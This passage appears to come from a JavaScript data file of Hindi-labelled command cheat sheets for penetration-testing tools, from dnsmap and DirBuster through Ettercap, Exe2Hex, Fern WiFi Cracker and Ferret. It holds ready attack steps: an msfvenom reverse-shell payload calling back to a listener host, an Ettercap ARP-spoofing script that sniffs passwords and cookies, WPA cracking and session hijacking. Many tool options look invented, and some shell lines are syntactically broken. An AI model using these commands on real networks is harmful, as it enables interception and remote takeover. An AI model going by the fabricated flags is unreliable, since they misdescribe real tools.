      ["-c <delay>", "विलंब मिलीसेकंड"],
      ["-i <ip>", "IP पता"],
      ["-d <domain>", "डोमेन"],
      ["-e", "एक्सटेंशन जोड़ें"],
      ["-6", "IPv6"],
      ["-q", "शांत मोड"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "dnsmap example.com", desc: "DNS सबडोमेन ब्रूटफ़ोर्स" },
      { cmd: "dnsmap example.com -w /usr/share/wordlists/dnsmap.txt", desc: "कस्टम वर्डलिस्ट से" },
      { cmd: "dnsmap example.com -r results.txt", desc: "परिणाम फ़ाइल में सेव" },
      { cmd: "dnsmap example.com -c 100", desc: "100ms विलंब के साथ" },
      { cmd: "dnsmap example.com -e", desc: "एक्सटेंशन के साथ ब्रूटफ़ोर्स" },
      { cmd: "dnsmap example.com -v", desc: "वर्बोज़ आउटपुट" },
      { cmd: "dnsmap example.com -q", desc: "शांत मोड" },
      { cmd: "dnsmap example.com -r subdomains.txt -w /usr/share/wordlists/dnsmap.txt -c 50", desc: "तेज़ थ्रॉटल के साथ" },
      { cmd: "dnsmap example.com -i 8.8.8.8", desc: "कस्टम DNS सर्वर" },
      { cmd: "dnsmap sub.example.com", desc: "सबडोमेन का सबडोमेन स्कैन" }
    ],
    advanced: [
      { cmd: "dnsmap example.com -r subs.txt -c 10 -v 2>&1 | tee dnsmap.log", desc: "तेज़ स्कैन लॉग करें" },
      { cmd: "dnsmap example.com -w /usr/share/wordlists/dnsmap.txt -e | grep -i 'found'", desc: "मिले डोमेन फ़िल्टर" },
      { cmd: "for domain in $(cat targets.txt); do dnsmap $domain -r ${domain}_subs.txt; done", desc: "एकाधिक डोमेन" },
      { cmd: "dnsmap example.com -v 2>&1 | awk '/IP/ {print $3}' | sort -u > ips.txt", desc: "अद्वितीय IP निकालें" },
      { cmd: "dnsmap example.com -w /usr/share/dnsmap/wordlist_TLAs.txt", desc: "TLA वर्डलिस्ट स्कैन" }
    ],
    script: "for domain in $(cat domains.txt); do\n  echo 'स्कैन:' $domain\n  dnsmap $domain -r \"${domain}_subdomains.txt\" -c 50 -q 2>/dev/null\ndone\necho 'सभी सबडोमेन स्कैन पूर्ण'"
  },
  DirBuster: {
    install: { pkg: "dir-buster" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-t <threads>", "थ्रेड काउंट"],
      ["-e <ext>", "एक्सटेंशन जोड़ें"],
      ["-r", "रीकर्सिव मोड"],
      ["-s <status>", "स्थिति कोड फ़िल्टर"],
      ["-x <ext>", "एक्सक्लूड एक्सटेंशन"],
      ["-f", "फ़ोल्डर मोड"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-H <header>", "कस्टम हेडर"]
    ],
    basic: [
      { cmd: "dirbuster -u http://example.com -w /usr/share/wordlists/dirb/common.txt", desc: "डायरेक्टरी ब्रूटफ़ोर्स" },
      { cmd: "dirbuster -u http://example.com -t 100", desc: "100 थ्रेड्स के साथ" },
      { cmd: "dirbuster -u http://example.com -e php,html,txt", desc: "फ़ाइल एक्सटेंशन चेक" },
      { cmd: "dirbuster -u http://example.com -r", desc: "रीकर्सिव मोड" },
      { cmd: "dirbuster -u http://example.com -s 200,301", desc: "सफल स्थिति कोड फ़िल्टर" },
      { cmd: "dirbuster -u http://example.com -f", desc: "फ़ोल्डर ब्रूटफ़ोर्स" },
      { cmd: "dirbuster -u http://example.com -o report.txt", desc: "रिपोर्ट सेव करें" },
      { cmd: "dirbuster -u http://example.com -w wordlist.txt -t 50", desc: "50 थ्रेड ब्रूटफ़ोर्स" },
      { cmd: "dirbuster -u http://example.com -x pdf,zip", desc: "एक्सटेंशन बाहर करें" },
      { cmd: "dirbuster -u http://example.com -H 'Authorization: Bearer token'", desc: "ऑथ हेडर के साथ" }
    ],
    advanced: [
      { cmd: "dirbuster -u http://example.com -w wordlist.txt -t 100 -r -e php 2>&1 | tee scan.txt", desc: "रीकर्सिव PHP स्कैन" },
      { cmd: "dirbuster -u http://example.com -s 200,204,301,302 -r -l | grep '^200'", desc: "सफल पेज फ़िल्टर" },
      { cmd: "for ext in php asp jsp do; dirbuster -u http://example.com -e $ext -o scan_$ext.txt; done", desc: "सभी एक्सटेंशन स्कैन" },
      { cmd: "dirbuster -u http://example.com -r -t 200 -H 'Cookie: session=abc' -w custom.txt", desc: "कुकी के साथ रीकर्सिव" },
      { cmd: "dirbuster -u http://example.com -f -s 403 -w dirs.txt | grep -i 'found'", desc: "403 निषिद्ध डायर खोजें" }
    ],
    script: "for url in $(cat targets.txt); do\n  name=$(echo $url | sed 's|https\\?://||' | tr '/' '_')\n  dirbuster -u $url -w /usr/share/wordlists/dirb/common.txt -t 50 -r -o \"dirb_${name}.txt\" -q 2>/dev/null\ndone\necho 'सभी डायरेक्टरी स्कैन पूर्ण'"
  },
  DavTest: {
    install: { pkg: "dav-test" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-f <file>", "फ़ाइल नाम"],
      ["-U <user>", "यूज़रनेम"],
      ["-P <pass>", "पासवर्ड"],
      ["-p <ext>", "एक्सटेंशन परीक्षण"],
      ["-t <type>", "HTTP मेथड"],
      ["-r", "रीकर्सिव"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-o <file>", "आउटपुट"]
    ],
    basic: [
      { cmd: "davtest -u http://example.com/webdav", desc: "WebDAV परीक्षण" },
      { cmd: "davtest -u http://example.com -p php", desc: "PHP अपलोड परीक्षण" },
      { cmd: "davtest -u http://example.com -U admin -P password", desc: "प्रमाणीकृत परीक्षण" },
      { cmd: "davtest -u http://example.com -f shell", desc: "कस्टम फ़ाइल नाम परीक्षण" },
      { cmd: "davtest -u http://example.com -t PUT", desc: "PUT मेथड परीक्षण" },
      { cmd: "davtest -u http://example.com -r", desc: "रीकर्सिव परीक्षण" },
      { cmd: "davtest -u http://example.com -s", desc: "साइलेंट मोड" },
      { cmd: "davtest -u http://example.com -o results.txt", desc: "परिणाम फ़ाइल में" },
      { cmd: "davtest -u http://example.com/webdav -v", desc: "वर्बोज़ परीक्षण" },
      { cmd: "davtest -u http://example.com -p php,asp,aspx,jsp", desc: "एकाधिक एक्सटेंशन" }
    ],
    advanced: [
      { cmd: "davtest -u http://example.com -U admin -P pass -p php -v 2>&1 | tee davtest.log", desc: "प्रमाणीकृत वर्बोज़ परीक्षण" },
      { cmd: "davtest -u http://example.com -r -p php,asp,aspx,jsp 2>&1 | grep 'SUCCEED'", desc: "सफल अपलोड प्रकार फ़िल्टर" },
      { cmd: "davtest -u http://example.com -t OPTIONS -v | grep -i 'allow\\|methods'", desc: "समर्थित मेथड जाँच" },
      { cmd: "for url in $(cat dav_targets.txt); do davtest -u $url -s; done > dav_results.txt", desc: "एकाधिक WebDAV परीक्षण" },
      { cmd: "davtest -u http://example.com -f test -p php -s 2>&1 | awk '/SUCCEED/{print}'", desc: "सिर्फ़ सफल नतीजे" }
    ],
    script: "echo 'WebDAV परीक्षण शुरू...'\ndavtest -u http://example.com/webdav -U admin -P password -p php,asp,txt -v 2>&1 | tee /tmp/davtest.txt\ngrep -E 'SUCCEED|FAIL' /tmp/davtest.txt > dav_summary.txt\necho 'परीक्षण रिपोर्ट dav_summary.txt में'"
  },
  Dex2Jar: {
    install: { pkg: "dex2-jar" },
    options: [
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-f", "फ़ोर्स ओवरराइट"],
      ["-d", "डीबग मोड"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["-e", "एक्सक्लूड क्लास"],
      ["-r", "रीसोर्स शामिल"],
      ["-s", "साइलेंट"],
      ["-n <ver>", "एंड्रॉइड वर्ज़न"],
      ["-c", "कंटीन्यू ऑन एरर"]
    ],
    basic: [
      { cmd: "dex2jar classes.dex", desc: "Dex से JAR बनाएँ" },
      { cmd: "dex2jar -o app.jar classes.dex", desc: "JAR आउटपुट नाम सेट" },
      { cmd: "dex2jar -f classes.dex", desc: "फ़ोर्स ओवरराइट" },
      { cmd: "dex2jar -v classes.dex", desc: "वर्बोज़ मोड" },
      { cmd: "dex2jar -d classes.dex", desc: "डीबग मोड" },
      { cmd: "dex2jar -o /tmp/output.jar app.dex", desc: "निर्दिष्ट पथ पर आउटपुट" },
      { cmd: "dex2jar -f -v app.dex", desc: "वर्बोज़ फ़ोर्स ओवरराइट" },
      { cmd: "dex2jar -e com.example.test classes.dex", desc: "क्लास बाहर करें" },
      { cmd: "d2j-dex2jar.sh -f app.apk", desc: "APK से सीधे JAR" },
      { cmd: "d2j-dex2jar.sh -o classes.jar classes.dex", desc: "JAR आउटपुट नाम" }
    ],
    advanced: [
      { cmd: "d2j-dex2jar.sh -f -v app.apk 2>&1 | tee dex2jar.log", desc: "APX से JAR लॉग करें" },
      { cmd: "for f in *.dex; do dex2jar -f -o $(basename $f .dex).jar $f; done", desc: "एकाधिक DEX कन्वर्ट" },
      { cmd: "d2j-dex2jar.sh -f app.apk && d2j-jar2jasmin.sh app-dex2jar.jar -o jasmin/", desc: "DEX2JAR और JASMIN" },
      { cmd: "dex2jar -v classes.dex 2>&1 | grep -i 'error\\|convert'", desc: "कन्वर्ज़न एरर फ़िल्टर" },
      { cmd: "unzip -o app.apk classes.dex && dex2jar -f classes.dex", desc: "APK अनज़िप और कन्वर्ट" }
    ],
    script: "cd /tmp/apk_analysis\nfor apk in *.apk; do\n  unzip -o $apk classes.dex 2>/dev/null\n  if [ -f classes.dex ]; then\n    dex2jar -f -v classes.dex -o \"$(basename $apk .apk).jar\" 2>/dev/null\n    rm classes.dex\n  fi\ndone\necho 'सभी APK से JAR बनाए गए'"
  },
  Dex2Smali: {
    install: { pkg: "dex2-smali" },
    options: [
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-f", "फ़ोर्स ओवरराइट"],
      ["-a <api>", "API लेवल"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-s", "साइलेंट"],
      ["-j <threads>", "थ्रेड काउंट"],
      ["-r", "रीसोर्स डीकंपाइल"],
      ["-b", "बैक्समली"],
      ["--help", "सहायता"]
    ],
    basic: [
      { cmd: "smali disassemble classes.dex -o smali_out", desc: "Dex डिसअसेंबल करें" },
      { cmd: "baksmali d classes.dex -o smali", desc: "baksmali से डिसअसेंबल" },
      { cmd: "smali assemble smali_out -o classes.dex", desc: "Smali से Dex बनाएँ" },
      { cmd: "baksmali d app.apk -o smali_src", desc: "APK डिसअसेंबल" },
      { cmd: "smali a smali -o classes.dex -a 29", desc: "API 29 के लिए असेंबल" },
      { cmd: "baksmali d classes.dex -f -o out", desc: "फ़ोर्स ओवरराइट डिसअसेंबल" },
      { cmd: "baksmali d classes.dex -v", desc: "वर्बोज़ डिसअसेंबल" },
      { cmd: "smali a smali -o classes.dex -j 4", desc: "4 थ्रेड के साथ असेंबल" },
      { cmd: "baksmali d classes.dex -a 28 -o api28", desc: "API 28 लक्ष्य" },
      { cmd: "smali disassemble app.apk -r -o dex_source", desc: "रीसोर्स के साथ डिसअसेंबल" }
    ],
    advanced: [
      { cmd: "baksmali d classes.dex -v 2>&1 | tee baksmali.log", desc: "डिसअसेंबल लॉग" },
      { cmd: "for f in *.dex; do baksmali d $f -o $(basename $f .dex)_smali; done", desc: "एकाधिक DEX डिसअसेंबल" },
      { cmd: "baksmali d app.apk -o /tmp/smali && grep -r 'const-string' /tmp/smali/", desc: "स्ट्रिंग खोज" },
      { cmd: "baksmali d classes.dex && smali a out -o new_classes.dex", desc: "डिसअसेंबल और रीअसेंबल" },
      { cmd: "baksmali d classes.dex -v 2>&1 | grep -i 'error\\|warning'", desc: "त्रुटि फ़िल्टर" }
    ],
    script: "mkdir -p /tmp/decompiled\nfor dex in *.dex classes*.dex; do\n  if [ -f \"$dex\" ]; then\n    baksmali d \"$dex\" -o \"/tmp/decompiled/$(basename $dex .dex)\" 2>/dev/null\n  fi\ndone\necho 'डिसअसेंबली पूर्ण'"
  },
  Dradis: {
    install: { pkg: "dradis" },
    options: [
      ["-p <port>", "सर्वर पोर्ट"],
      ["-b <ip>", "बाइंड IP"],
      ["-d <dir>", "डेटाबेस डायरेक्टरी"],
      ["-e <env>", "वातावरण"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-c <file>", "कॉन्फ़िग"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["-r", "रीस्टोर"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "dradis start", desc: "Dradis सर्वर शुरू" },
      { cmd: "dradis start -p 3000", desc: "पोर्ट 3000 पर शुरू" },
      { cmd: "dradis start -b 0.0.0.0", desc: "सभी इंटरफ़ेस पर शुरू" },
      { cmd: "dradis start -e production", desc: "प्रोडक्शन मोड" },
      { cmd: "dradis start -d /opt/dradis/db", desc: "कस्टम डेटाबेस पथ" },
      { cmd: "dradis stop", desc: "Dradis सर्वर बंद" },
      { cmd: "dradis restart", desc: "Dradis सर्वर रीस्टार्ट" },
      { cmd: "dradis reset", desc: "डेटाबेस रीसेट" },
      { cmd: "dradis start -c /etc/dradis/config.yml", desc: "कॉन्फ़िग फ़ाइल से" },
      { cmd: "dradis start -l /var/log/dradis.log", desc: "लॉग फ़ाइल सेट" }
    ],
    advanced: [
      { cmd: "dradis start -p 3000 -b 0.0.0.0 -l /var/log/dradis.log -v 2>&1", desc: "पूर्ण लॉग के साथ शुरू" },
      { cmd: "dradis start -p 3000 & && sleep 5 && curl http://localhost:3000", desc: "सर्वर शुरू और टेस्ट" },
      { cmd: "dradis start -e production 2>&1 | grep -i 'error\\|listening'", desc: "शुरू में त्रुटियाँ जाँच" },
      { cmd: "dradis backup -o /backups/dradis_$(date +%Y%m%d).dump", desc: "डेटाबेस बैकअप" },
      { cmd: "dradis start -p 3000 -s 2>&1 | tee /var/log/dradis_stdout.log", desc: "साइलेंट मोड लॉग" }
    ],
    script: "dradis start -p 3000 -b 0.0.0.0 -l /var/log/dradis.log -v 2>&1 &\nsleep 3\nif curl -s http://127.0.0.1:3000 > /dev/null; then\n  echo 'Dradis चल रहा है पोर्ट 3000 पर'\nfi"
  },
  EDBDebugger: {
    install: { pkg: "edb-debugger" },
    options: [
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-s <script>", "Python स्क्रिप्ट"],
      ["-c <cmd>", "कमांड चलाएँ"],
      ["-p <pid>", "प्रोसेस अटैच"],
      ["-t <file>", "टर्मिनल सेटिंग"],
      ["-d", "डीबग मोड"],
      ["-n", "नया इंस्टेंस"],
      ["-h", "सहायता"],
      ["-v", "वर्बोज़"],
      ["-V", "संस्करण"]
    ],
    basic: [
      { cmd: "edb --run /bin/ls", desc: "बाइनरी डीबग करें" },
      { cmd: "edb --attach $(pidof sshd)", desc: "प्रोसेस अटैच करें" },
      { cmd: "edb -r /root/script.edb", desc: "स्क्रिप्ट फ़ाइल लोड" },
      { cmd: "edb --run /tmp/test.exe", desc: "Windows बाइनरी डीबग" },
      { cmd: "edb -p 1234", desc: "PID से अटैच" },
      { cmd: "edb --run /bin/bash -c 'echo test'", desc: "आर्ग्युमेंट्स के साथ डीबग" },
      { cmd: "edb -n", desc: "नया EDB इंस्टेंस" },
      { cmd: "edb -d", desc: "डीबग मोड" },
      { cmd: "edb -s exploit.py", desc: "Python स्क्रिप्ट चलाएँ" },
      { cmd: "edb -v", desc: "वर्बोज़ मोड" }
    ],
    advanced: [
      { cmd: "edb --run /bin/ls -d 2>&1 | tee edb_debug.log", desc: "डीबग आउटपुट लॉग" },
      { cmd: "edb --run './vuln $(python -c \"print('A'*100)\")'", desc: "बफ़र ओवरफ़्लो डीबग" },
      { cmd: "edb -p $(pidof apache2) -s plugins/shellcode_detector.py", desc: "अपाचे डीबग शेलकोड डिटेक्ट" },
      { cmd: "echo 'run' | edb --run /bin/ls 2>&1", desc: "पाइप इनपुट से डीबग" },
      { cmd: "edb -r /tmp/script.edb 2>&1 | grep -i 'breakpoint\\|exception'", desc: "ब्रेकपॉइंट और एरर फ़िल्टर" }
    ],
    script: "PROC_PID=$(pidof $1)\nif [ -n \"$PROC_PID\" ]; then\n  edb --attach $PROC_PID -s plugins/auto_script.py 2>/dev/null\nelse\n  echo 'प्रोसेस नहीं मिली'\nfi"
  },
  Ettercap: {
    install: { pkg: "ettercap" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-T", "टेक्स्ट मोड"],
      ["-G", "GUI मोड"],
      ["-M <mitm>", "MITM विधि"],
      ["-w <file>", "PCAP फ़ाइल"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["-F <file>", "फ़िल्टर फ़ाइल"],
      ["-p", "पैसिव मोड"],
      ["-u", "यूनिबिफ़ोर्केड"],
      ["-R", "रीड-ओनली"]
    ],
    basic: [
      { cmd: "ettercap -T -i eth0 -M arp", desc: "ARP स्पूफ़ MITM" },
      { cmd: "ettercap -G", desc: "GUI मोड शुरू" },
      { cmd: "ettercap -T -M arp /192.168.1.1// /192.168.1.100//", desc: "दो लक्ष्यों के बीच ARP" },
      { cmd: "ettercap -T -i eth0 -M arp -w capture.pcap", desc: "PCAP कैप्चर के साथ" },
      { cmd: "ettercap -T -i eth0 -M arp -l log.txt", desc: "लॉग फ़ाइल में सेव" },
      { cmd: "ettercap -T -i eth0 -F filter.ecf -M arp", desc: "फ़िल्टर के साथ MITM" },
      { cmd: "ettercap -T -i eth0 -p", desc: "पैसिव स्निफ़िंग" },
      { cmd: "ettercap -R -r capture.pcap", desc: "PCAP फ़ाइल पार्स" },
      { cmd: "ettercap -T -M arp // // -i eth0", desc: "पूरे सबनेट पर MITM" },
      { cmd: "ettercap -T -M dhcp:ip_pool", desc: "DHCP स्पूफ़ MITM" }
    ],
    advanced: [
      { cmd: "ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// -w mitm.pcap -l mitm.log", desc: "रीमोट ARP लॉग और कैप्चर" },
      { cmd: "etterfilter filter.ecf -o filter.ef && ettercap -T -F filter.ef -M arp", desc: "फ़िल्टर कंपाइल और उपयोग" },
      { cmd: "ettercap -T -M arp // // -i eth0 & && tcpdump -i eth0 -w all.pcap", desc: "Ettercap और tcpdump समानांतर" },
      { cmd: "ettercap -T -M arp -i eth0 -l logfile 2>&1 | grep -i 'pass\\|user\\|cookie'", desc: "क्रेडेंशियल फ़िल्टर" },
      { cmd: "ettercap -T -M arp:oneway /192.168.1.1// // -i eth0", desc: "वन-वे ARP स्पूफ़" }
    ],
    script: "echo 'MITM अटैक शुरू...'\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080\nettercap -T -M arp:remote // // -i eth0 -w mitm.pcap -l sniff.log &\nsleep 30\npkill ettercap\necho 'स्निफ़िंग समाप्त'"
  },
  Exe2Hex: {
    install: { pkg: "exe2-hex" },
    options: [
      ["-f <file>", "इनपुट फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-s <size>", "लाइन साइज़"],
      ["-c", "C प्रारूप"],
      ["-p", "Python प्रारूप"],
      ["-j", "JS प्रारूप"],
      ["-b", "बाइनरी प्रारूप"],
      ["-d", "डीबग"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "exe2hex -f shellcode.bin", desc: "बाइनरी HEX में बदलें" },
      { cmd: "exe2hex -f payload.exe -o payload.hex", desc: "EXE को HEX फ़ाइल में" },
      { cmd: "exe2hex -f shellcode.bin -c", desc: "C प्रारूप में आउटपुट" },
      { cmd: "exe2hex -f shellcode.bin -p", desc: "Python प्रारूप में" },
      { cmd: "exe2hex -f shellcode.bin -j", desc: "जावास्क्रिप्ट प्रारूप" },
      { cmd: "exe2hex -f payload.bin -s 16", desc: "16 बाइट प्रति लाइन" },
      { cmd: "exe2hex -f /tmp/shellcode -o /tmp/hex_output.txt", desc: "आउटपुट पथ निर्दिष्ट" },
      { cmd: "exe2hex -f payload.bin -v", desc: "वर्बोज़ मोड" },
      { cmd: "exe2hex -f payload.bin -b", desc: "बाइनरी प्रारूप आउटपुट" },
      { cmd: "exe2hex -f msf.exe -c -o shellcode.c", desc: "MSF पेलोड C प्रारूप" }
    ],
    advanced: [
      { cmd: "exe2hex -f payload.bin -c -v 2>&1 | tee convert.log", desc: "C प्रारूप कन्वर्ज़न लॉग" },
      { cmd: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw | exe2hex -f - -c", desc: "MSF पेलोड सीधे HEX" },
      { cmd: "for f in *.bin; do exe2hex -f $f -c -o $(basename $f .bin).c; done", desc: "एकाधिक BIN कन्वर्ट" },
      { cmd: "exe2hex -f payload.bin -p 2>&1 | grep -v '^#' > payload.py; python3 -c 'exec(open(\"payload.py\").read())'", desc: "HEX से Python और रन" },
      { cmd: "exe2hex -f payload.bin -j | xclip -selection clipboard", desc: "JS HEX क्लिपबोर्ड पर" }
    ],
    script: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o /tmp/shellcode.bin\nexe2hex -f /tmp/shellcode.bin -c -o /tmp/shellcode.c 2>/dev/null\necho 'शेलकोड C फ़ॉर्मेट में:/tmp/shellcode.c'"
  },
  Faraday: {
    install: { pkg: "faraday" },
    options: [
      ["-s <host>", "सर्वर होस्ट"],
      ["-p <port>", "सर्वर पोर्ट"],
      ["-c <cert>", "SSL सर्टिफ़िकेट"],
      ["-k <key>", "SSL की"],
      ["-d <dir>", "डेटा डायरेक्टरी"],
      ["-e <env>", "वातावरण"],
      ["-v", "वर्बोज़"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["--dev", "डेवलपमेंट मोड"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "faraday-server -s 0.0.0.0 -p 5985", desc: "Faraday सर्वर शुरू" },
      { cmd: "faraday-server -d /opt/faraday/data", desc: "डेटा डायरेक्टरी सेट" },
      { cmd: "faraday-server -c cert.pem -k key.pem", desc: "SSL के साथ सर्वर" },
      { cmd: "faraday-server -e production -l /var/log/faraday.log", desc: "प्रोडक्शन मोड लॉग" },
      { cmd: "faraday-server -p 443 -c /etc/ssl/certs/faraday.pem", desc: "HTTPS पोर्ट 443" },
      { cmd: "faraday-server -v", desc: "वर्बोज़ मोड" },
      { cmd: "faraday-server --dev", desc: "डेवलपमेंट मोड" },
      { cmd: "faraday-cli tool run nmap -sV 192.168.1.0/24", desc: "CLI से nmap स्कैन" },
      { cmd: "faraday-cli workspace create pentest1", desc: "नया वर्कस्पेस बनाएँ" },
      { cmd: "faraday-cli host list", desc: "होस्ट सूची दिखाएँ" }
    ],
    advanced: [
      { cmd: "faraday-server -s 0.0.0.0 -p 5985 -d /data/faraday -e production -v 2>&1 | tee faraday.log", desc: "पूर्ण प्रोडक्शन सर्वर" },
      { cmd: "faraday-cli tool run 'nmap -sS -sV -O 192.168.1.0/24 -oA scan1'", desc: "CLI से nmap ऑल-इन-वन" },
      { cmd: "faraday-cli tool run 'nikto -h http://example.com' && faraday-cli report generate", desc: "nikto स्कैन और रिपोर्ट" },
      { cmd: "faraday-cli workspace import -f nessus_scan.nessus -t nessus", desc: "Nessus रिपोर्ट इम्पोर्ट" },
      { cmd: "for tool in nmap nikto; do faraday-cli tool run $tool --help; done", desc: "टूल हेल्प देखें" }
    ],
    script: "faraday-server -s 0.0.0.0 -p 5985 -d /opt/faraday/data &\nsleep 5\nfaraday-cli workspace create engagement1\nfaraday-cli tool run 'nmap -sV 192.168.1.0/24'\nfaraday-cli report generate -f pdf\n"
  },
  Fastboot: {
    install: { pkg: "fastboot" },
    options: [
      ["devices", "डिवाइस सूची"],
      ["flash <part> <img>", "पार्टीशन फ़्लैश"],
      ["boot <img>", "इमेज बूट करें"],
      ["reboot", "रिबूट करें"],
      ["getvar <var>", "वेरिएबल दिखाएँ"],
      ["oem <cmd>", "OEM कमांड"],
      ["erase <part>", "पार्टीशन मिटाएँ"],
      ["format <part>", "पार्टीशन फ़ॉर्मेट"],
      ["unlock", "बूटलोडर अनलॉक"],
      ["lock", "बूटलोडर लॉक"]
    ],
    basic: [
      { cmd: "fastboot devices", desc: "कनेक्टेड डिवाइस सूची" },
      { cmd: "fastboot flash boot boot.img", desc: "बूट पार्टीशन फ़्लैश" },
      { cmd: "fastboot flash recovery recovery.img", desc: "रिकवरी फ़्लैश करें" },
      { cmd: "fastboot flash system system.img", desc: "सिस्टम इमेज फ़्लैश" },
      { cmd: "fastboot boot custom.img", desc: "इमेज बूट करें" },
      { cmd: "fastboot reboot", desc: "डिवाइस रिबूट करें" },
      { cmd: "fastboot getvar all", desc: "सभी वेरिएबल दिखाएँ" },
      { cmd: "fastboot oem unlock", desc: "बूटलोडर अनलॉक" },
      { cmd: "fastboot erase cache", desc: "कैश पार्टीशन मिटाएँ" },
      { cmd: "fastboot format cache", desc: "कैश पार्टीशन फ़ॉर्मेट" }
    ],
    advanced: [
      { cmd: "fastboot flash boot boot.img && fastboot flash recovery recovery.img && fastboot reboot", desc: "एकाधिक पार्टीशन फ़्लैश" },
      { cmd: "fastboot getvar all | grep -i 'version\\|serial'", desc: "डिवाइस जानकारी फ़िल्टर" },
      { cmd: "fastboot flash boot boot.img 2>&1 | tee flash.log", desc: "फ़्लैश लॉग करें" },
      { cmd: "for img in boot recovery system vendor; do if [ -f ${img}.img ]; then fastboot flash $img ${img}.img; fi; done", desc: "सभी इमेज फ़्लैश" },
      { cmd: "fastboot oem device-info 2>&1 | grep -i 'unlock\\: true'", desc: "अनलॉक स्थिति जाँच" }
    ],
    script: "if fastboot devices | grep -q fastboot; then\n  echo 'डिवाइस फ़्लैश मोड में'\n  for part in boot recovery system; do\n    [ -f \"${part}.img\" ] && fastboot flash $part ${part}.img && echo \"$part फ़्लैश किया\"\n  done\n  fastboot reboot\nfi"
  },
  FernWiFiCracker: {
    install: { pkg: "fern-wi-fi-cracker" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-s <ssid>", "SSID चुनें"],
      ["-b <bssid>", "BSSID चुनें"],
      ["-c <ch>", "चैनल"],
      ["-o <file>", "आउटपुट"],
      ["-m <mode>", "मोड"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "fern-wifi-cracker -i wlan0", desc: "Fern WiFi Cracker शुरू" },
      { cmd: "fern-wifi-cracker -i wlan0 -w /usr/share/wordlists/rockyou.txt", desc: "वर्डलिस्ट से क्रैक" },
      { cmd: "fern-wifi-cracker -i wlan0 -m wpa", desc: "WPA क्रैक मोड" },
      { cmd: "fern-wifi-cracker -i wlan0 -s MyWiFi", desc: "SSID निर्दिष्ट करें" },
      { cmd: "fern-wifi-cracker -i wlan0 -b 00:11:22:33:44:55", desc: "BSSID निर्दिष्ट" },
      { cmd: "fern-wifi-cracker -i wlan0 -c 6", desc: "चैनल 6 पर स्कैन" },
      { cmd: "fern-wifi-cracker -i wlan0 -o crack_results.txt", desc: "परिणाम सेव करें" },
      { cmd: "fern-wifi-cracker -i wlan0 -v", desc: "वर्बोज़ मोड" },
      { cmd: "fern-wifi-cracker -i wlan0 -m wep", desc: "WEP क्रैक मोड" },
      { cmd: "fern-wifi-cracker -i wlan0 -q", desc: "शांत मोड" }
    ],
    advanced: [
      { cmd: "fern-wifi-cracker -i wlan0 -m wpa -w /usr/share/wordlists/rockyou.txt -v 2>&1 | tee fern.log", desc: "WPA क्रैक पूर्ण लॉग" },
      { cmd: "for ch in 1 6 11; do fern-wifi-cracker -i wlan0 -c $ch -q; done", desc: "सभी चैनल स्कैन" },
      { cmd: "fern-wifi-cracker -i wlan0 -o results.txt 2>&1 | grep -i 'key\\|password'", desc: "मिले पासवर्ड फ़िल्टर" },
      { cmd: "airodump-ng wlan0 -w capture && fern-wifi-cracker -i wlan0", desc: "कैप्चर और क्रैक" },
      { cmd: "fern-wifi-cracker -i wlan0 -b 00:11:22:33:44:55 -m wpa -w wordlist.txt -v", desc: "लक्षित WPA क्रैक" }
    ],
    script: "airmon-ng start wlan0\nfern-wifi-cracker -i wlan0mon -m wpa -w /usr/share/wordlists/rockyou.txt -v 2>&1 | tee /tmp/fern_$(date +%Y%m%d).log\necho 'WiFi क्रैकिंग समाप्त'"
  },
  Ferret: {
    install: { pkg: "ferret" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-p <file>", "PCAP फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-d", "डीबग"],
      ["-c", "कुकी दिखाएँ"],
      ["-r", "रीड-ओनली"],
      ["-u", "URL फ़िल्टर"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "ferret -i eth0", desc: "सेशन हाइजैक शुरू" },
      { cmd: "ferret -r capture.pcap", desc: "PCAP फ़ाइल पार्स" },
      { cmd: "ferret -i eth0 -o session.txt", desc: "आउटपुट फ़ाइल में" },
      { cmd: "ferret -i eth0 -v", desc: "वर्बोज़ मोड" },
      { cmd: "ferret -i eth0 -c", desc: "कुकी दिखाएँ" },
      { cmd: "ferret -i eth0 -u example.com", desc: "URL फ़िल्टर" },
      { cmd: "ferret -i eth0 -s", desc: "साइलेंट मोड" },
      { cmd: "ferret -i wlan0", desc: "वायरलेस इंटरफ़ेस" },
      { cmd: "ferret -i eth0 -d", desc: "डीबग मोड" },
      { cmd: "ferret -r http_traffic.pcap -o parsed.txt", desc: "PCAP पार्स और सेव" }
    ],
    advanced: [
      { cmd: "ferret -i eth0 -v -c 2>&1 | tee ferret.log", desc: "सेशन कुकी लॉग" },
